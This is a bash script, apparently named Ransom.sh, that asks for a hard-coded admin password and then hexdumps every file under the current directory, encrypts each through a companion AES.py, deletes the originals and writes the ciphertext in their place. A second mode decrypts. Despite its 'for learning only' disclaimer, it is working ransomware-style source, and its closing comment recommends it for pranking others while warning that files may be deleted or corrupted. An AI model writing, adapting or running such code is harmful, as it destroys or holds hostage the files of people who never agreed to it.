#!/bin/bash

# THIS PROGRAM IS INTEDED FOR HAVING FUN & LEARNING ONLY
# DO NOT EXPLOIT OTHERS WITH THIS PROGRAM
# ONLY EXECUTE IN A SAFE ENVIRONMENT
# EXECUTION WILL BE ON YOUR OWN REPONSIBILITY

sudoPass="c6ba787d156bf5b91c3681b6b1c0e6b9"
echo -n "Would You Like To Encrypt Or Decrypt (Hexdump) (1/2)>"
read mode

# Code Method Using `xxd` As A Hexdump Creator And Reverter In Order To Successfully Transform The Files With Maximum Precision From Hexdump to Original File And Vice Versa

# Mode 1: (Encrypt) { Takes Password From User And Decodes It In B64 Then Hashes It To Compare With Above Globally Initialized Variable, Once The User Enters The Right Password The Program Will Execute }

if [ $mode = '1' ]
then
    echo -n "Enter The Admin Password:"
    read password
    passCode=`echo -ne $password | base64 | md5sum | tr -d "-" | tr -d " "`
    if [ $passCode = $sudoPass ]
    then
        echo "==================================================="
        echo "============== GATHERING INFORMATION =============="
        files=`find . -path ./.git -prune -false -o -type f`
        files=($(echo $files | tr '\b' '\n'))
        echo $files
        numOptions=${#files[@]}
        for (( counter=0; counter<${numOptions}; counter++))
        do
            if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]
            then
                unset -v 'files[$counter]'
                continue
            fi
            echo ${files[counter]}
            `xxd ${files[counter]} > HD`
            `./AES.py "$sudoPass" "HD" 1`
            `rm ${files[counter]}`
            `cat HD > ${files[counter]}`
            `rm HD`
        done
        echo "============= Encryption Successful ==============="
        echo "==================================================="
    else
        echo "Password Is Incorrect!"
    fi
# Mode 2: (Decrypt) { Once The User Enters The Correct Password And The Comparison Is True, The Program Will Execute And Decrypt All Files }

elif [ $mode = '2' ]
then
    echo -n "Enter The Admin Password:"
    read password
    passCode=`echo -ne $password | base64 | md5sum | tr -d "-" | tr -d " "`
    if [ $passCode = $sudoPass ]
    then
        echo "==================================================="
        echo "============== GATHERING INFORMATION =============="
        files=`find . -path ./.git -prune -false -o -type f`
        files=($(echo $files | tr '\b' '\n'))
        numOptions=${#files[@]}                                         
        for (( counter=0; counter<${numOptions}; counter++))         
        do                         
            if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]
            then                                                          
                unset -v 'files[$counter]'     
                continue
            fi
            echo ${files[counter]}
            `./AES.py "$sudoPass" "${files[counter]}" 2`
            `xxd -r DD > ${files[counter]}`
            `rm DD`
        done
        echo "============= Decryption Successful ==============="
        echo "==================================================="
    else
        echo "Password Is Incorrect!"
    fi
fi

# This Program Is Useful For File Transfer Through Poor Encrypted Platforms Or Pranking Others { NOTE: SOME FILES MAY BE DELETED OR CORRUPTED :) }

# =========================== By Avalancher ===============================

